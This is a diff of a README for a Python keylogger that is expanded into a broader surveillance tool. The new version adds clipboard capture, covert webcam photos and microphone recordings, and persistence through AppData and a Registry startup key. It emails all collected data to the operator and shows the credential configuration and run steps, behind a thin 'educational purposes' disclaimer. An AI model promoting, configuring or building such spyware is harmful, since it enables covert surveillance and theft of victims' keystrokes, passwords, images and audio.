@@ -1,25 +1,30 @@
-# Advanced Python Key Logger
+# Ultimate Python Key Logger
 
-A robust key logger built for cybersecurity research and educational purposes. This version includes advanced features like system information gathering, screenshots, active window logging, log encryption, and email reporting.
+A comprehensive surveillance tool built for cybersecurity research. This key logger goes beyond simple keystroke capturing to include system monitoring, multimedia recording, and persistence.
 
 ## ⚠️ Disclaimer
 
 **This tool is for educational purposes only.**
-Unauthorized use of key loggers is illegal and unethical. Ensure you have explicit permission from the device owner before running this software. The author is not responsible for any misuse.
+Unauthorized use of surveillance software is illegal. Ensure you have explicit permission from the device owner. The author is not responsible for any misuse.
 
 ## Features
 
 - **Keystroke Logging**: Captures all keys pressed.
-- **Active Window Logging**: Records the window title where the keys were pressed.
-- **System Information**: Logs IP, Hostname, Processor, and System details on startup.
-- **Screenshots**: Captures screenshots at set intervals.
-- **Encryption**: Logs are encrypted using Fernet (symmetric encryption).
-- **Email Reporting**: Sends logs and screenshots to your email.
+- **Active Window Logging**: Records the window title.
+- **Clipboard Monitoring**: Logs copied text.
+- **System Information**: Logs IP, Hostname, etc.
+- **Multimedia Recording**:
+  - **Screenshots**: Captures screen periodically.
+  - **Webcam**: Takes photos from the webcam.
+  - **Microphone**: Records short audio clips.
+- **Encryption**: Logs are encrypted (AES/Fernet).
+- **Persistence**: Automatically runs on system startup (copies to AppData + Registry key).
+- **Email Reporting**: Sends all collected data to your email.
 
 ## Prerequisites
 
 - Python 3.x
-- Windows OS (for `pywin32` support)
+- Windows OS (required for persistence and window logging)
 
 ## Installation
 
@@ -39,41 +44,28 @@ Unauthorized use of key loggers is illegal and unethical. Ensure you have explic
 ## Usage
 
 1. **Configuration**:
-    Open `main.py` and edit the `KeyLogger` instantiation at the bottom of the file:
+    Edit `main.py` to set your email credentials:
 
     ```python
     keylogger = KeyLogger(
-        time_interval=600,         # Report interval in seconds
-        email="your_email@gmail.com", 
-        password="your_email_password" # Use App Password for Gmail
+        time_interval=300,         # Report interval in seconds
+        email="your_email@gmail.com",
+        password="your_app_password"
     )
     ```
 
-2. **Run the script**:
+2. **Run**:
 
     ```bash
     python main.py
     ```
 
-3. **Logs**:
-    - `keylog.enc`: Encrypted keystroke logs.
-    - `screenshot_*.png`: Captured screenshots.
-    - `key.key`: The encryption key (KEEP THIS SAFE to decrypt your logs!).
+3. **Output**:
+    - `keylog.enc`: Encrypted log.
+    - `screenshot_*.png`: Screenshots.
+    - `webcam_*.jpg`: Webcam photos.
+    - `audio_*.wav`: Audio recordings.
 
-## Decrypting Logs
+## Decryption
 
-To read `keylog.enc`, you will need to write a small script using the generated `key.key`:
-
-```python
-from cryptography.fernet import Fernet
-
-with open("key.key", "rb") as k:
-    key = k.read()
-
-cipher = Fernet(key)
-
-with open("keylog.enc", "rb") as f:
-    encrypted_data = f.read()
-
-print(cipher.decrypt(encrypted_data).decode())
-```
+Use the `key.key` generated on the first run to decrypt your logs (see `main.py` logic or create a decryption script).
